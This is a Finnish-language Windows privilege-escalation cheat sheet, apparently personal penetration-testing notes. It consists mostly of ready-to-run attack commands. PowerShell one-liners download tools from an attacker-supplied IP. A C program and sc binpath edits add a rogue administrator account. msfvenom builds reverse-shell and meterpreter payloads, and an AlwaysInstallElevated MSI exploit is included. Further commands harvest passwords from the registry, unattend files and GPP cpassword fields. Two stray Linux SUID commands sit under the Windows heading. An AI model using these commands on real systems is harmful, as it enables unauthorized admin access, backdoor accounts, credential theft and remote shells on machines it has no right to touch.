## Windows privesc ##

* Version bittisyys: 
  - wmic os get osarchitecture

* Etsi tiedostot joissa SUID
  - find / -perm +4000 -user root -type f -print
* Sama mutta SGID
  - find / -perm +2000 -user root -type f -print

* Filun lataus powershellillä: 
 - powershell IEX(New-Object Net.WebClient).DownloadString('http://<IP>:80/accesschk.exe')
 - powershell Invoke-WebRequest -Uri "http://<IP>:80/accesschk.exe" -OutFile "C:\Users\Matti\AppData\Local\Temp\accesschk.exe"
 - Vanhemmalla versiolla (testattu 2:lla): 
   * powershell (New-Object System.Net.WebClient).DownloadFile('http://<IP>:80/ms16-014.exe', 'C:\wamp\www\ms16-014.exe') 

* Permissioiden tarkistus: Integrity Control Access Control Lists (icacls)
 - icacls <polku>

* Windowsiin voi tehdä käyttäjän komennolla: net user <käyttäjänimi> <salasana> /add
* Lisääminen grouppiin: net localgroup "Groupin nimi" <käyttäjänimi> /add
* Servicet näkee komennolla: services.msc

* Ajastetut toiminnot:
 - schtasks /query /fo LIST /v

* Patchaysten tila: 
 - wmic qfe get Caption,Description,HotFixID,InstalledOn
 - Katso privesc exploittien, kuten KiTrap0D (KB979682), MS11-011 (KB2393802), MS10-059 (KB982799), MS10-021 (KB979683), MS11-080 (KB2592799), KB patch numerot. 
 - Tietyn KB Patchin haku: wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."

* Unquoted Service Paths:
 - wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
 - Automaattinen exploittaus metasploitilla: exploit/windows/local/trusted_service_path

* Koodi, jolla voi tehdä uuden käyttäjän:
	root@kali:~# cat useradd.c
	#include <stdlib.h> /* system, NULL, EXIT_FAILURE */
	int main ()
	{
	 int i;
	 i=system ("net localgroup administrators low /add");
	 return 0;
	}
	root@kali:~# i686-w64-mingw32-gcc -o exploitti.exe useradd.c
* Voi tehdä myös Msfvenomilla: windows/adduser, tai: msfvenom -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai LHOST=<IP> LPORT=443 -f exe -o <unquoted_file>.exe

* Haavoittuvien serviceiden haku AccessChk:lla
 - accesschk.exe -uwcqv "Authenticated Users" * /accepteula
 - Konffien katsominen: sc qc <palvelu>
 - Käyttäjän lisäys muokaamalla tämä binpathia: sc config <palvelu> binpath= "net user rottenadmin P@ssword123! /add"
 - Sitten sc stop <palvelu> ja sc start <palvelu> + sc config PFNET binpath= "net localgroup Administrators rottenadmin /add" ja vielä kerran stop ja start
 - Sama Metasploitilla: exploit/windows/local/service_permissions

* Always install elevated:
 - reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 - reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
   * Jos näiden arvo on 1, exploittaa:
    - msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o rotten.msi
    - msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\rotten.msi
   * Metasploitilla: exploit/windows/local/always_install_elevated

* Unattend ja muut filut:
  - Unattend.xml
  - sysprep.xml ja sysprep.inf
  - Salasanat kohdassa: <UserAccounts>
  - Metasploitilla: post/windows/gather/enum_unattend

* Domain controllerissa GPP-filu
  - Löytyy sysvol-kansiosta nimellä Groups.xml -> täältä cpassword-field
  - Avain passujen decryptaamiseen: https://msdn.microsoft.com/en-us/library/Cc422924.aspx
  - Skripti: https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1
  - Metasploitilla: post/windows/gather/credentials/gpp
  - Passujen hyödyntäminen psexecillä

* Interaktiivinen powershell shelli Metasploitilla
  - windows/local/payload_inject, tälle payload: windows/powershell_reverse_tcp

* Passut ja muut kivat:
  - dir /s *pass* == *cred* == *vnc* == *.config*
  - findstr /si password *.xml *.ini *.txt
  - reg query HKLM /f password /t REG_SZ /s
  - reg query HKCU /f password /t REG_SZ /s

* DLL hijacking
  - DLL search order on 32-bit systems:
    1 - The directory from which the application loaded
    2 - 32-bit System directory (C:\Windows\System32)
    3 - 16-bit System directory (C:\Windows\System)
    4 - Windows directory (C:\Windows)
    5 - The current working directory (CWD)
    6 - Directories in the PATH environment variable (system then user)
  - echo %path%
  - msfpayload windows/shell_reverse_tcp lhost='127.0.0.1' lport='9988' D > /root/Desktop/evil.dll

* Find all weak folder permissions per drive.
  - accesschk.exe -uwdqs Users c:\
  - accesschk.exe -uwdqs "Authenticated Users" c:\

* Find all weak file permissions per drive.
  - accesschk.exe -uwqs Users c:\*.*
  - accesschk.exe -uwqs "Authenticated Users" c:\*.*

